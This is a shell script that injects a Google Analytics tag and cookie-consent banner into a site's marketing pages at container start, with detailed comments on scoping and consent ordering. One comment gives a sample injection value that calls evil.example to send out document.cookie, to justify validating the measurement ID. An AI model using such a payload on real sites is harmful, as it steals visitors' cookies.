#!/bin/sh
# Google Analytics — and the cookie banner that gates it — injected at container start, and
# only where they are wanted.
#
# ── Why runtime and not build time ────────────────────────────────────────────
#
# One image serves staging and production; scripts/seo-runtime.sh makes the same argument
# for sitemaps. Baking a measurement ID into the build would mean two different images AND a
# staging site reporting its own traffic into the production property — the ordinary way
# analytics data quietly becomes worthless. Given no GA_MEASUREMENT_ID this script does
# nothing, so an untagged environment is the default and production opts in with one
# variable. That is the right way round: a forgotten variable costs a report, whereas
# forgetting to EXCLUDE staging costs the integrity of every number in the property.
#
# ── Why only the marketing pages ──────────────────────────────────────────────
#
# Scope is defined by where the `<!--analytics-->` marker is, and it is in index.html only.
# That file is the template scripts/prerender.mjs copies into every marketing document, so
# the six public pages get the tag and the other three surfaces cannot, by construction:
#
#   app.html     a signed-in surface. Sending customer behaviour to Google is a decision
#                nobody has taken here, and it would need a lawful basis and a line in the
#                privacy policy before it were taken.
#   ops.html     staff only. Nothing to learn, and it is not public.
#   widget.html  loaded in an iframe on OUR CUSTOMERS' sites. A third-party tracker added to
#                their pages, past their visitors, is not ours to add.
#
# To change that scope, move the marker — not this script.
#
# ── Consent ───────────────────────────────────────────────────────────────────
#
# The tag and public/consent.js are injected together and cannot come apart, so there is no
# state where the site sets an analytics cookie with nothing on screen asking about it — and
# none where a banner asks about a tag that was never added. Consent Mode v2 starts denied;
# see the ordering note above the snippet, which is the part that is easy to get wrong.
set -eu

ROOT="${SEO_ROOT:-/usr/share/nginx/html}"
MARKER='<!--analytics-->'

GA_ID="${GA_MEASUREMENT_ID:-}"

if [ -z "$GA_ID" ]; then
  echo "[analytics] no GA_MEASUREMENT_ID — leaving the pages untagged."
  # The marker stays in place, unlike the SEO placeholders: it is an HTML comment, so it is
  # invisible, valid, and it documents where the tag goes for whoever reads the shipped HTML.
  exit 0
fi

# The ID is interpolated into a <script> body, so it is validated rather than trusted. An
# unchecked value here is script injection into every public page: `GA_MEASUREMENT_ID` set to
# `x');fetch('//evil.example?c='+document.cookie);('` would simply run. A GA4 measurement ID
# is `G-` followed by uppercase alphanumerics; this accepts that shape and refuses the rest.
if ! printf '%s' "$GA_ID" | grep -Eq '^G-[A-Z0-9]{6,20}$'; then
  echo "[analytics] '$GA_ID' is not a GA4 measurement ID (G-XXXXXXXXXX) — refusing to inject it."
  # Exit 0, loudly, rather than failing. nginx's own entrypoint runs /docker-entrypoint.d/*.sh
  # under `set -e`, so a non-zero exit here does not just skip the tag — it aborts startup and
  # takes the whole site down. A typo in this variable must cost a report, never the site.
  exit 0
fi

echo "[analytics] tagging the marketing pages with $GA_ID"

SNIPPET="$(mktemp)"
trap 'rm -f "$SNIPPET"' EXIT

# ── The order of the three parts below is the whole correctness argument ──────
#
# 1. `consent default` MUST precede `config`. Consent Mode decides what the very first hit is
#    allowed to do, and `config` is what sends it. Set the default afterwards and the page_view
#    has already written a cookie — the notice becomes decoration and the compliance claim is
#    false. This is why the default lives in the inline snippet and not in consent.js, which is
#    deferred and therefore always too late.
#
# 2. Everything is denied unless storage says otherwise. A visitor who accepted previously is
#    read out of localStorage RIGHT HERE, synchronously, so their default is `granted` and
#    their first page view counts properly. Doing that read in the deferred file instead would
#    downgrade every returning visitor's first hit to a cookieless ping.
#
# 3. `ad_*` stay denied unconditionally. We run no advertising; declaring the Consent Mode v2
#    signals rather than omitting them is what keeps the tag from inferring a permission.
#
# The `try` around localStorage is not defensive padding — it throws outright in Safari with
# cookies blocked, and an exception here would abort the script element and take `gtag` with
# it, so the page would silently have no analytics AND no working banner.
cat > "$SNIPPET" <<HTML
    <!-- Google tag (gtag.js) — injected at container start by scripts/analytics-runtime.sh -->
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      (function () {
        var stored = null;
        try { stored = window.localStorage.getItem('nestled.consent'); } catch (e) {}
        gtag('consent', 'default', {
          ad_storage: 'denied',
          ad_user_data: 'denied',
          ad_personalization: 'denied',
          analytics_storage: stored === 'granted' ? 'granted' : 'denied'
        });
      })();
      gtag('js', new Date());
      gtag('config', '${GA_ID}');
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=${GA_ID}"></script>
    <!-- The banner that collects the decision, and the control that withdraws it. -->
    <script src="/consent.js" defer></script>
HTML

# awk rather than `sed`: the replacement is multi-line, which sed does not do without
# contortions, and this is explicit about consuming the marker line.
#
# Idempotent for free. A restarted container re-runs this against a filesystem where the
# marker has already been replaced, the grep below finds nothing, and the file is left alone
# — so no amount of restarting can stack two copies of the tag.
tagged=0
for file in "$ROOT"/*.html; do
  [ -f "$file" ] || continue
  grep -qF "$MARKER" "$file" || continue

  awk -v marker="$MARKER" -v snippet="$SNIPPET" '
    index($0, marker) {
      while ((getline line < snippet) > 0) print line
      close(snippet)
      next
    }
    { print }
  ' "$file" > "$file.tmp"
  mv "$file.tmp" "$file"
  tagged=$((tagged + 1))
done

echo "[analytics] tagged $tagged document(s)"
